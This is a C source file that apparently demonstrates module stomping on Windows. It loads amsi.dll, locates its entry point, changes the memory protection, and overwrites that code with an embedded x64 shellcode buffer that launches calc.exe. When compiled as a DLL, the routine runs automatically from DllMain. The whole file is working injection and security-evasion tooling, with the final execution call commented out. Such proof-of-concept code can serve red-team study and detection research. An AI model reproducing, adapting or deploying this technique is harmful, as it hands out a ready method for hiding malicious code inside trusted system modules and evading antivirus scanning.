#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

BOOL LoadMyLibrary() {
    HMODULE hModule = LoadLibrary("C:\\Windows\\System32\\amsi.dll");
    if (hModule == NULL) {
        printf("Failed to load library\n");
        return FALSE;
    }
    return TRUE;
}

DWORD64 GetModuleBaseAddress(DWORD dwProcessId, const char* szModuleName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwProcessId);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    MODULEENTRY32 ModuleEntry32 = { 0 };
    ModuleEntry32.dwSize = sizeof(MODULEENTRY32);
    DWORD64 dwModuleBaseAddress = 0;
    if (Module32First(hSnapshot, &ModuleEntry32)) {
        do {
            if (lstrcmpi(ModuleEntry32.szModule, szModuleName) == 0) {
                dwModuleBaseAddress = (DWORD64)ModuleEntry32.modBaseAddr;
                break;
            }
        } while (Module32Next(hSnapshot, &ModuleEntry32));
    }
    CloseHandle(hSnapshot);
    return dwModuleBaseAddress;
}

DWORD64 getDLLEntryPointAddress(HANDLE processHandle, DWORD64 baseAddress) {
    void* buffer = calloc(0x1000, sizeof(char));
    if (!buffer) {
        return NULL;
    }
    DWORD bufferSize = 0x1000;
    ReadProcessMemory(processHandle, (PVOID)baseAddress, buffer, bufferSize, NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dosHeader->e_lfanew);
    return ntHeader->OptionalHeader.AddressOfEntryPoint + baseAddress;

}

void WriteShellcode(HANDLE processHandle, DWORD64 entryPointAddress, unsigned char* shellcode, SIZE_T shellcodeSize) {
    SIZE_T bytesWritten = 0;
    // Change memory protection to allow writing
    DWORD oldProtect;
    VirtualProtectEx(processHandle, (LPVOID)entryPointAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Use memcpy to copy the shellcode
    memcpy((void*)entryPointAddress, shellcode, shellcodeSize);

    // Restore the original memory protection
    VirtualProtectEx(processHandle, (LPVOID)entryPointAddress, shellcodeSize, oldProtect, &oldProtect);
    // WriteProcessMemory(processHandle, (LPVOID)entryPointAddress, (LPCVOID)shellcode, shellcodeSize, &bytesWritten);
}

__declspec(dllexport) BOOL StartW() {
    // Load a library in the current process, in this case amsi.dll
    LoadMyLibrary();
    // Get the base address of a module in the current process
    DWORD64 baseAddress = GetModuleBaseAddress(GetCurrentProcessId(), "amsi.dll");
    printf("[i] Base address of amsi.dll: 0x%p\n", baseAddress);
    getchar();
    // Get the entry point of a module in the current process
    DWORD64 entryPoint = getDLLEntryPointAddress(GetCurrentProcess(), baseAddress);
    printf("[i] Entry point of amsi.dll: 0x%p\n", entryPoint);
    getchar();
    // Write shellcode to the entry point of a module in the current process
    WriteShellcode(GetCurrentProcess(), entryPoint, buf, sizeof(buf));
    printf("[i] Shellcode written to amsi.dll\n");
    printf("[i] Press Enter to execute the shellcode\n");
    getchar();
    // Execute the shellcode
    // ((void(*)())entryPoint)();
    return 0;
}

#ifdef BUILD_DLL
__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(0, "Hello from DllMain!", "DLL Message", MB_OK | MB_ICONINFORMATION);
            StartW();
            break;
        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;
        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally
            break;
        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is unloaded
            break;
    }
    return TRUE; // Successful DLL_PROCESS_ATTACH
}
#else
int main() {
    StartW();
    return 0;
}
#endif
